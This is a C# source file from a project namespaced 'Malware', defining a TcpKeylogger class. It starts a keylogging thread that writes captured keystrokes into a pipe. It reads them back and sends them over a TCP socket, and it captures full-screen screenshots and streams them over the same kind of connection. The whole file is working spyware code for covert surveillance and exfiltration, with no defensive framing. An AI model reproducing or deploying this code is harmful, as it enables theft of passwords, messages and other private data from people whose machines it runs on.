using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.IO;
using System.Drawing;
using System.Runtime.InteropServices;

namespace Malware
{
    internal class TcpKeylogger
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static Boolean CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static Boolean CreatePipe(out IntPtr readPipe, out IntPtr writePipe,IntPtr options,uint size);


        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool PeekNamedPipe(IntPtr Handle,IntPtr buffer,uint bufferSize,IntPtr lpBytesRead,out UInt32 lpTotalBytesAvail,IntPtr lpBytesLeftThisMessage);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool ReadFile(IntPtr handle, byte[] data, uint length, out uint llengh, IntPtr overlap);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int GetSystemMetrics(int nIndex);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool SetProcessDPIAware();


        private static IntPtr readPipe;
        private static IntPtr writePipe;
        private static uint logThreadId;
        
        private static IntPtr handle;
        public static void startKeylog()
        {


            if(CreatePipe(out readPipe, out writePipe, IntPtr.Zero, 0))
            {
                handle = Keylogger.Keylogger.CreateThread(IntPtr.Zero, 0, Keylogger.Keylogger.StartKeylogger, writePipe, 0, out logThreadId);
            }

        }

        public static void stopKeylog()
        {
            Keylogger.Keylogger.PostThreadMessageA(logThreadId, 0x8001, IntPtr.Zero, IntPtr.Zero);
            Keylogger.Keylogger.WaitForSingleObject(handle, 0xffffffff);
            CloseHandle(handle);
            CloseHandle(writePipe);
            CloseHandle(readPipe);
            
        }


        public static void SendKeylog(Socket sock){
            uint j = 0;
            
            PeekNamedPipe(readPipe, IntPtr.Zero, 0, IntPtr.Zero, out j, IntPtr.Zero);
            while (j > 0)
            {

                uint total = 0;
                var data = new byte[1024];
                ReadFile(readPipe, data, 1024, out total, IntPtr.Zero);
                j -= total;
                sock.Send(data,0,(int)total,SocketFlags.None);
                

            }
            sock.Send(new byte[]{0xa});
        }

        public static void SendScreenShot(Socket sock){
            var ms = new MemoryStream();
            takeScreenShot(ms);
            Console.WriteLine("Image Size {0}",ms.Length);
            //var base64 = System.Convert.ToBase64String(ms.GetBuffer());
            //Console.WriteLine("Base Size {0}",base64.Length);
            var ns = new NetworkStream(sock);

            var sw = new StreamWriter(ns);
            //sw.WriteLine(base64);
            sw.WriteLine(ms.Length.ToString("x"));
            ms.Seek(0,SeekOrigin.Begin);
            ms.CopyTo(ns);
            ms.Close();

            sw.Close();
            ns.Close();
        }
        
        private static void takeScreenShot(System.IO.MemoryStream memoryStream)
        {

            SetProcessDPIAware();
            int x = GetSystemMetrics(78);
            int y = GetSystemMetrics(79);

            Bitmap bmp = new Bitmap(x, y);
            var s = new Size(x,y);
            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(Point.Empty, Point.Empty, s);
                bmp.Save(memoryStream, System.Drawing.Imaging.ImageFormat.Png);
            }
        }
        
    }
}
